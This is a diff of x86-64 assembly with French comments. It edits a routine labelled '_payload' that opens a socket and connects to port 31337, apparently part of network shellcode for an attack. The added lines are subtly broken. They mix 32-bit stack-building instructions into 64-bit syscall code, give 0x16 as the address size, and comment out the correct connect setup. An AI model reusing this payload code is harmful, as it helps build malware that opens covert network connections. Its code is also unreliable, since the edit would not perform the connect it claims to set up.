@@ -71,10 +71,21 @@ _payload:
     mov r13, rax                  ; Sauvegarder le descripteur de socket dans r13
 
     ; Préparer la structure sockaddr_in
-    lea rdi, [rel sockaddr_in]
-    mov rax, 42                   ; SYS_connect
-    mov rsi, r13                  ; Socket
-    mov rdx, 16                   ; Taille de sockaddr_in
+	xor rax,rax
+	push rax                ;0,0
+	push WORD 0x697a        ;htonos(31337)
+	push WORD 0x02          ;2
+	mov ecx,esp
+
+	push 0x16               ;sizeof(host_addr)
+	push rcx                ;host_addr
+	push rsi
+	xor rbx,rbx
+	mov rcx,rsp
+    ; lea rdi, [rel sockaddr_in]
+    ; mov rax, 42                   ; SYS_connect
+    ; mov rsi, r13                  ; Socket
+    ; mov rdx, 16                   ; Taille de sockaddr_in
     syscall
     test rax, rax
     js close_socket               ; Si erreur, fermer la socket et le fichier, et quitter
